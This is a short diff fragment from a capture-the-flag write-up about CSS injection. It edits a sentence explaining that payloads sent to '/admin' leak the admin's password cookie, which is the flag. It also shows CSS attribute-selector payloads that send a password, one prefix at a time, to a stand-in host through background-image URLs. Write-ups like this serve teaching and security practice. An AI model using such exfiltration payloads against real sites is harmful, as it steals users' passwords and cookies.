@@ -40,7 +40,7 @@ input[type="password"][value^="cc"] {background-image: url('https://example.com?
 ...
 ```
 
-An so on, until you find the entire password. The final payload with the help of which you can find the entire flag is:
+An so on, until you find the entire password. Pass these payloads to `/admin` and you can leak the admin cookie `password`, which is the flag. The final payload with the help of which you can find the entire flag is:
 
 ```css
 blue;} input[type="password"][value^="csictf{cssxss}"] {background-image: url('http://localhost:8000?csictf{cssxss}');
